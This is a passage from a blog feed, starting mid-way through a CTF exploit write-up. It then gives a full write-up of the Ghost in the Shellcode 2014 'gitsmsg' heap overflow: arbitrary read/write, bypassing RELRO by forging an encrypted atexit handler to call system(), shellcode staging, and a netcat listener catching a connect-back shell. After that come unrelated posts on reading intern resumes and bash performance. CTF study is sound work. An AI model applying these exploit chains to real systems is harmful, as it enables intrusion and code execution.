&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;call&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;memset_fptr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dontcollide&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0xcb&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;call&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;memset_fptr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dontcollide&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x13&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;call&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;memset_fptr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dontcollide&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x40&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We then can use our gadget to call &lt;code&gt;readAll&lt;/code&gt;, 
reading the encrypted shellcode into &lt;code&gt;dontcollide&lt;/code&gt;, and then again to call
&lt;code&gt;callFunction&lt;/code&gt;, executing our shellcode. &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# Read the shellcode into a buffer. The socket to read from is 4.&lt;/span&gt;
&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;call&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dontcollide&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dontcollide&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x400&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c1"&gt;# Call our shellcode.&lt;/span&gt;
&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;call&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;callEncryptedFunction_fptr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dontcollide&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We grab some connect back shellcode 
and get a shell:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;~% python fuzzy.py                                           [console 1]&lt;/span&gt;
&lt;span class="go"&gt;~% nc -l 16705                                               [console 2]&lt;/span&gt;
&lt;span class="go"&gt;cat key.txt&lt;/span&gt;
&lt;span class="go"&gt;key is: fuzzingIsFun2&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;</content><category term="ctf"></category><category term="exploitation"></category></entry><entry><title>Ghost in the Shellcode 2014 - gitsmsg</title><link href="https://codearcana.com/posts/2014/01/19/ghost-in-the-shellcode-2014-gitsmsg.html" rel="alternate"></link><published>2014-01-19T00:00:00-08:00</published><updated>2014-01-19T00:00:00-08:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2014-01-19:/posts/2014/01/19/ghost-in-the-shellcode-2014-gitsmsg.html</id><summary type="html">&lt;p&gt;&lt;em&gt;tl;dr&lt;/em&gt; - &lt;code&gt;gitsmsg&lt;/code&gt; is a messaging server. A heap overflow led to arbitrary read / write and eventual code exec 
after circumventing RELRO. Binary and exploit available &lt;a
href="http://ppp.cylab.cmu.edu/wordpress/wp-content/uploads/2014/01/gitsmsg.tar.gz"&gt;here&lt;/a&gt;. Cross post from 
&lt;a href="http://ppp.cylab.cmu.edu/wordpress/?p=1152"&gt;PPP blog&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;The program&lt;/h2&gt;
&lt;p&gt;First, we reverse engineered much of the binary. 
You "login" as a user, then can compose …&lt;/p&gt;</summary><content type="html">&lt;p&gt;&lt;em&gt;tl;dr&lt;/em&gt; - &lt;code&gt;gitsmsg&lt;/code&gt; is a messaging server. A heap overflow led to arbitrary read / write and eventual code exec 
after circumventing RELRO. Binary and exploit available &lt;a
href="http://ppp.cylab.cmu.edu/wordpress/wp-content/uploads/2014/01/gitsmsg.tar.gz"&gt;here&lt;/a&gt;. Cross post from 
&lt;a href="http://ppp.cylab.cmu.edu/wordpress/?p=1152"&gt;PPP blog&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;The program&lt;/h2&gt;
&lt;p&gt;First, we reverse engineered much of the binary. 
You "login" as a user, then can compose messages to other users. The messages
were saved to a linked list and could be edited before being serialized to disk.
Each message is a tagged union of &lt;code&gt;{byte,dword,double}{_,array}&lt;/code&gt;
or &lt;code&gt;string&lt;/code&gt;. A &lt;code&gt;string&lt;/code&gt; indexed into an array of static strings.
A "typical" usage might be:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# After connection, appropriate functions hide the binary protocol.&lt;/span&gt;
&lt;span class="n"&gt;login&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;alex&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;newmessage&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;to&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;andrew&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;msg_type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;DWORD_ARRAY&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;count&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;17&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;newmassage&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;to&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;max&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;msg_type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;STRING&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;count&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;edit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msgid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;offset&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;14&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;delete&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msgid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;save&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;disconnect&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;The vulnerability&lt;/h2&gt;
&lt;p&gt;In short, when initializing one of the message type, the programmer forgot to
factor the data type width when calculating the message size:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="nl"&gt;DOUBLE_ARRAY&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
  &lt;span class="n"&gt;size&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;count&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;size&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;count&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;v3&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;count&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mh"&gt;0x3FF&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;v4&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;count&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;1023&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;v0&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;count&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;count&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;v3&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="n"&gt;v4&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;goto&lt;/span&gt; &lt;span class="n"&gt;LABEL_9&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;malloc&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This eventually gives us a heap overwrite:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;readAll&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;At this point, it seems relatively straightforward. We will allocate 2 messages,
leaving the heap in this state:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;| message A | data A | message B |
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We then free the first message:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;| &amp;lt;free&amp;gt; | &amp;lt;free&amp;gt; | message B |
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And allocate a new message of type &lt;code&gt;DOUBLE_ARRAY&lt;/code&gt;, allowing us to overwrite and
modify the second message:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;| message C | data C ... essage B |
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Our goal will be to overwrite a GOT entry and give us a shell. Since the program
is PIE, we have to leak an address first. We do this by editing the second
message which does 2 things for us: it allows us to put it back into a valid
state, and it will put a address from the &lt;code&gt;.data&lt;/code&gt; segment into the heap (if a 
&lt;code&gt;string&lt;/code&gt; message is edited, it will update the message data pointer to point
to the correct string in the &lt;code&gt;.data&lt;/code&gt; segment). &lt;/p&gt;
&lt;p&gt;Actually, at this point we have an arbitrary read and an arbitrary write
primitive. Since the data for the first message overlaps with the type and 
pointer of the second message, we can edit the first message to change the type
of the second. If we change the type of the second message to &lt;code&gt;dword&lt;/code&gt; and its
pointer to &lt;code&gt;&amp;lt;address&amp;gt;&lt;/code&gt;, we can get the contents of the second message to read 
from that address and edit the contents of the second message to write to that
address.&lt;/p&gt;
&lt;p&gt;Once we have the program base, we use our arbitrary read primitive to leak a
&lt;code&gt;libc&lt;/code&gt; address. We know it is an Ubuntu machine, so we download a couple versions
of &lt;code&gt;libc&lt;/code&gt; and compare the address to the symbol in each of the versions to match
the correct &lt;code&gt;libc&lt;/code&gt; version. We can now overwrite &lt;code&gt;free&lt;/code&gt; with &lt;code&gt;system&lt;/code&gt; and delete
our message to get a shell!&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;free_addr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;arbitrary_read&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;prog_base&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0x4f2c&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;head&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;prog_base&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0x5160&lt;/span&gt;
&lt;span class="n"&gt;libc_base&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;free_addr&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mh"&gt;0x781b0&lt;/span&gt;
&lt;span class="n"&gt;system_addr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;libc_base&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0x3d170&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Except this didn't work - the program had full RELRO support, so the GOT was
read only. &lt;/p&gt;
&lt;p&gt;To get around this, we had to do some painful stuff. We noticed a directory
traversal attack in the login function, and though we could use that to put the
key into the heap (and read it later). Unfortunately, the &lt;code&gt;malloc&lt;/code&gt;
implementation  seemed to clobber the key after it freed the blob. Instead, 
our strategy
was to overwrite an &lt;code&gt;atexit&lt;/code&gt; handler function pointer located in &lt;code&gt;libc&lt;/code&gt; with the
address of &lt;code&gt;system&lt;/code&gt; and to overwrite the argument for this handler with a buffer
we controlled. Unfortunately, this function pointer was encrypted. To decrypt, 
we computed what the function pointer was supposed to be by leaking an address 
from &lt;code&gt;ld.so&lt;/code&gt; and using the address and the encrypted value to calculate the key.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;rtld_global_ro_address&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;arbitrary_read&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;libc_base&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0x1a0ef8&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;ld_base&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;rtld_global_ro_address&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mh"&gt;0x20ca0&lt;/span&gt;
&lt;span class="n"&gt;ld_fini_address&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ld_base&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0xf270&lt;/span&gt;
&lt;span class="n"&gt;encrypted_atexit_handler&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;arbitrary_read&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;libc_base&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0x1a21ec&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;xor_key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ror&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;encrypted_atexit_handler&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="n"&gt;ld_fini_address&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We then encrypted our target address with this key, update the function pointer
to use our new address and updated the argument to point to a buffer we
controlled&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;encrypted_system&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;rol&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;system_addr&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="n"&gt;xor_key&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;arbitrary_write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;libc_base&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0x1a21ec&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;encrypted_system&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;arbitrary_write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;libc_base&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0x1a21f0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;obj0&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0x110&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;To trigger our exploit, we just sent the disconnect message (which fortunately 
didn't disconnect the socket). For our final exploit, we used the payload 
&lt;code&gt;cat key &amp;gt;&amp;amp;4&lt;/code&gt; to dump the key to the already open socket.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; python gitsmsg.py
&lt;span class="go"&gt;Deleting messages ...&lt;/span&gt;
&lt;span class="go"&gt;Performing overflow ...&lt;/span&gt;
&lt;span class="go"&gt;Editing ...&lt;/span&gt;
&lt;span class="go"&gt;Getting ...&lt;/span&gt;
&lt;span class="go"&gt;Getting libc base ...&lt;/span&gt;
&lt;span class="go"&gt;Getting ld base ...&lt;/span&gt;
&lt;span class="go"&gt;Writing encrypted function pointer ...&lt;/span&gt;
&lt;span class="go"&gt;The key is: lol, tagged unions for the WIN!&lt;/span&gt;
&lt;span class="go"&gt;*** Connection closed by remote host ***&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;</content><category term="ctf"></category><category term="exploitation"></category></entry><entry><title>Reading intern resumes</title><link href="https://codearcana.com/posts/2013/09/25/reading-intern-resumes.html" rel="alternate"></link><published>2013-09-25T00:00:00-07:00</published><updated>2013-09-25T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2013-09-25:/posts/2013/09/25/reading-intern-resumes.html</id><summary type="html">&lt;p&gt;Tonight, I sat down and read through every resume in the 2013 SCS senior
resume book. Reading resumes for a company is really interesting, because
I find myself looking at them very differently. As a student, I didn't
really understand what sections of the resume are important. I thought
it …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Tonight, I sat down and read through every resume in the 2013 SCS senior
resume book. Reading resumes for a company is really interesting, because
I find myself looking at them very differently. As a student, I didn't
really understand what sections of the resume are important. I thought
it would be interesting to give a brief walk through of my resume scan
process&lt;sup id="fnref-1"&gt;&lt;a class="footnote-ref" href="#fn-1"&gt;1&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;
&lt;p&gt;I look at the sections of the resume in roughly this order:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;em&gt;Graduation year / major.&lt;/em&gt; I want to know if I'm dealing with a
     Sophomore/Junior/Senior so I know how to evaluate the classes
     and work experience. I also glance at the major, because there are
     a few majors that are red flags (no, I will not skip your resume
     if you are in IS. IS actually &lt;em&gt;isn't&lt;/em&gt; a red flag to me, and a single
     red flag is not a veto). &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;I do not care&lt;/em&gt; about your GPA, although I will be concerned if it 
      is below at 3.2.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;em&gt;Courses taken.&lt;/em&gt; I want to know what experience you have and what you find
     interesting (or what you think employers will find interesting).&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;I want to see&lt;/em&gt; the courses you've taken that &lt;em&gt;aren't&lt;/em&gt; required or
       were an option for you. In
       particular, I am interested in seeing the 300 and 400 level courses
       you've taken (if you're a systems person, for example, I expect to
       see more than one upper level systems course). While I cannot tell
       how well you did in the courses if you don't tell me (that 
       information would actually be super useful), I hope to get
       an idea of what interests you from your choice in courses. You should
       also be aware that as a CMU graduate, I'm well of the fact that some
       courses are more difficult than others. Did you take Compilers and
       Parallel as a Junior, or are just only now taking Distributed as a
       senior? If you're a sophomore who
       hasn't taken any of these courses yet, I'm interested in seeing which
       core courses you've taken.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;em&gt;Projects.&lt;/em&gt; I want to know what you've done when you had the freedom to 
     choose what to do.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;I want to see&lt;/em&gt; interesting projects you did for fun or as a 
     class final project where you got to choose what to do. &lt;/li&gt;
&lt;li&gt;&lt;em&gt;I don't want to see&lt;/em&gt; projects required for a course where you
     had no influence on the design. I took the same courses at CMU as
     you, I am wholly unimpressed by a "web proxy" project (and am 
     actually concerned if I see that on a senior resume).&lt;/li&gt;
&lt;li&gt;&lt;em&gt;I am worried by&lt;/em&gt; hackathon projects. This is my personal
     opinion, but I'm generally worried by projects that were intended
     to have a flashy demo and weren't designed for longevity. I want
     you to see projects that you're &lt;em&gt;proud&lt;/em&gt; of and am generally
     suspicious that a 2 day project has enough interesting ideas or
     well designed code for this.&lt;/li&gt;
&lt;li&gt;&lt;em&gt;I usually find it hard to discern anything&lt;/em&gt; from research projects. If
     you describe the interesting work the project is doing, it is
     hard to know what &lt;em&gt;you&lt;/em&gt; did. Even if you describe what you did, 
     it is hard to know how much influence you had in the design
     process for the project.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;At this point, I've learned enough to identify the people I definitely want to
talk to and the people I definitely don't want to talk to. To try to sort the
people I'm still not sure about, I will look at two more pieces of information:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;Order of languages on your resume.&lt;/em&gt; If you say you are a systems person but
    you put PHP ahead of C, I'm skeptical.&lt;/li&gt;
&lt;li&gt;&lt;em&gt;Other companies.&lt;/em&gt; If I'm otherwise unsure about your resume, but you've had 
    internships at large / good companies, thats a good sign. If you haven't had
    very many / any internships, thats a bad sign. I don't really read what you
    did - I assume you were like me and were involved on a project you didn't
    have much control over that wasn't related to the core business. &lt;/li&gt;
&lt;li&gt;&lt;em&gt;Teaching assistant for 200+ level courses.&lt;/em&gt; It is a good sign if you TA for
    a 200 level course or above (and a great sign if you TA for a 400 level
    course). There are a &lt;em&gt;lot&lt;/em&gt; of 100 level TAs, so it is hard to get anything
    meaningful out of that. Also, which semesters you were a TA can be helpful.&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="footnote"&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id="fn-1"&gt;
&lt;p&gt;Note this is the process I use for CMU resumes, where I know the courses intimately.&amp;#160;&lt;a class="footnote-backref" href="#fnref-1" title="Jump back to footnote 1 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;</content><category term="interviewing"></category><category term="hiring"></category></entry><entry><title>Bash Performance Tricks</title><link href="https://codearcana.com/posts/2013/08/06/bash-performance-tricks.html" rel="alternate"></link><published>2013-08-06T00:00:00-07:00</published><updated>2013-08-06T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2013-08-06:/posts/2013/08/06/bash-performance-tricks.html</id><summary type="html">&lt;p&gt;My coworkers presented a silly programming interview style question to
me the other day: given a list of words, find the largest set of words from
that list that all have the same hash value. Everyone was playing around
with a different language, and someone made the claim that it …&lt;/p&gt;</summary><content type="html">&lt;p&gt;My coworkers presented a silly programming interview style question to
me the other day: given a list of words, find the largest set of words from
that list that all have the same hash value. Everyone was playing around
with a different language, and someone made the claim that it couldn't be done
efficiently in &lt;code&gt;bash&lt;/code&gt;. Rising to the challenge, I rolled up my sleeves and
started playing around.&lt;/p&gt;
&lt;p&gt;The first trick was to figure out how to write the hash function in &lt;code&gt;bash&lt;/code&gt;.
&lt;code&gt;bash&lt;/code&gt; has functions, but they can only return an exit status in the range 0-255.
There are a couple of different ways to do that, but I opted to return the value
in a global variable. We also want to iterate through the letters of the word
and want to take great care not invoke another process while doing so (so
&lt;code&gt;while read letter; do math; done &amp;lt;(grep -o &amp;lt;&amp;lt;&amp;lt;$word)&lt;/code&gt; is out of the question).
Instead, we will use a &lt;code&gt;for&lt;/code&gt; loop with &lt;code&gt;bash&lt;/code&gt; expansions to iterate of each
character. Finally, we will use &lt;code&gt;bash&lt;/code&gt; 4.0 associative arrays map a letter to
its corresponding index (for computing hash values).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# We will return into this variable.&lt;/span&gt;
&lt;span class="nb"&gt;declare&lt;/span&gt; -i HASH_RESULT
